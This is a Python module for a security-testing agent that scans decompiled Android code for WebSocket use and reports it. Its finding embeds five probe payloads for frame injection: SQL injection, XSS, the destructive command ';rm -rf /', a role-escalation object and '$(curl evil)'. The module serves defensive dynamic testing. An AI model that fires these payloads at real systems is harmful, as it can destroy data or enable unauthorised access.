"""D_058 — WebSocket frame injector (Dynamic Testing Target)."""
from __future__ import annotations

import logging
import re

from sentinel.agents.base.base_agent import BaseAgent
from sentinel.core.finding import Finding, Severity

logger = logging.getLogger(__name__)
_WS_MARKERS_RE = re.compile(
    r"\bWebSocket\b|\bokhttp3\.WebSocket\b|\bnewWebSocket\b"
    r"|\bonMessage\s*\(\s*WebSocket\b"
)
_PROBES = [
    "{\"cmd\":\"login\",\"user\":\"admin'--\"}",
    "{\"cmd\":\"<script>alert(1)</script>\"}",
    "{\"cmd\":\"exec\",\"args\":[\";rm -rf /\"]}",
    "{\"role\":\"admin\",\"isAuth\":true}",
    "{\"chat\":\"$(curl evil)\"}",
]


class WebSocketInjectorAgent(BaseAgent):
    AGENT_ID = "D_058"
    VULN_CLASS = "WebSocket Frame Injection (Dynamic Testing Target)"
    PHASE = "Phase 2"

    async def is_applicable(self) -> bool:
        return bool(
            self._context.decompiled_dir
            and self._context.decompiled_dir.exists()
        )

    async def analyze(self) -> list[Finding]:
        root = self._context.decompiled_dir
        assert root is not None
        hits: set[str] = set()
        scanned = 0
        for path in root.rglob("*.java"):
            scanned += 1
            if scanned > 2000:
                break
            try:
                text = path.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            if _WS_MARKERS_RE.search(text):
                hits.add(str(path.relative_to(root)))
        if not hits:
            return []
        return [self._make_finding(
            vuln_class=self.VULN_CLASS,
            severity=Severity.MEDIUM,
            confidence=0.65,
            recommendation=(
                f"{len(hits)} WebSocket usage site(s) found. The Frida + "
                "mitmproxy hook will intercept outbound frames and inject "
                "5 probe payloads (SQLi, XSS, command-injection, role "
                "escalation, command-substitution) into the message body, "
                "then observe response shape. Validate every WebSocket "
                "message server-side; client-side is untrusted."
            ),
            evidence={
                "websocket_files": sorted(hits)[:15],
                "dynamic_target": True,
                "frida_payload": {
                    "probe_messages": _PROBES,
                    "intercept_at": "mitmproxy",
                    "frame_types": ["TEXT", "BINARY"],
                    "safety_budget": {
                        "max_actions_total": 25,
                        "max_actions_per_sec": 2,
                        "wall_clock_budget_s": 30,
                        "max_consecutive_crashes": 3,
                    },
                },
            },
        )]


__all__ = ["WebSocketInjectorAgent"]
